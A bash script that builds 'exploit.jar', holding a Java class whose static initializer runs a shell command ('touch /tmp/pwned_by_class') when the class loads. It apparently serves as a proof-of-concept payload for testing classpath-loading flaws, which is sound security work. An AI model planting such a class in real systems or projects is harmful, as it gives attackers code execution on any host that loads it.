#!/bin/bash

set -euo pipefail

# Target class name
CLASS_NAME="ExecOnLoad"
PACKAGE_DIR="exploit"
TARGET_DIR="./output_classes"
JAR_NAME="exploit.jar"
JAR_PATH="${TARGET_DIR}/${JAR_NAME}"

# Verify required tools
command -v javac >/dev/null 2>&1 || { echo "javac not found in PATH"; exit 1; }
command -v jar >/dev/null 2>&1 || { echo "jar tool not found in PATH"; exit 1; }

# Create output directory
mkdir -p "${TARGET_DIR}/${PACKAGE_DIR}"

# Create Java source file
cat > "${TARGET_DIR}/${PACKAGE_DIR}/${CLASS_NAME}.java" <<'EOF'
package exploit;

public class ExecOnLoad {
    static {
        try {
            Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", "touch /tmp/pwned_by_class"});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        // Trigger static initializer
        new ExecOnLoad();
    }
}
EOF

# Compile the class
javac "${TARGET_DIR}/${PACKAGE_DIR}/${CLASS_NAME}.java"

# Create the jar containing exploit/ExecOnLoad.class
# The jar will not set a Main-Class; it is intended for classpath loading.
# Remove any prior jar to avoid stale contents.
rm -f "${JAR_PATH}"
(
  cd "${TARGET_DIR}"
  jar cf "${JAR_NAME}" "${PACKAGE_DIR}/${CLASS_NAME}.class"
)

echo "Class compiled at: ${TARGET_DIR}/${PACKAGE_DIR}/${CLASS_NAME}.class"
echo "Jar created at:    ${JAR_PATH}"

